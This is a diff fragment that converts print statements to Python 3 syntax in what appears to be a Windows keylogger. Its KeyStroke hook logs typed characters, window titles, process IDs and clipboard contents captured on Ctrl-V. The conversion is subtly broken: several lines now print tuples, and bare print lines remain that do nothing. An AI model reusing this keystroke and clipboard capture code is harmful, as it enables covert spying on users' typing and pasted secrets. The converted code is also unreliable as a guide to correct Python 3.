@@ -39,7 +39,7 @@ def get_current_process():
 
     # print out the header if we're in the right process
     print
-    print "[PID: %s - %s - %s]" % (process_id, executable.value, window_title.value)
+    print ("[PID: %s - %s - %s]" % (process_id, executable.value, window_title.value))
     print
 
     # close handles
@@ -57,7 +57,7 @@ def KeyStroke(event):
 
     # check if they pressed standard key
     if event.Ascii > 32 and event.Ascii < 127:
-        print chr(event.Ascii),
+        print (chr(event.Ascii),)
     else:
         # check if ctrl-v has been used, if so get clipboard
         if event.Key == "V":
@@ -66,11 +66,11 @@ def KeyStroke(event):
             pasted_value = win32clipboard.GetClipboardData()
             win32clipboard.CloseClipboard()
 
-            print "[PASTE] - %s" % (pasted_value),
+            print ("[PASTE] - %s" % (pasted_value),)
 
         else:
 
-            print "[%s]" % event.Key
+            print( "[%s]" % event.Key)
 
     # pass execution to next hook registered
     return True
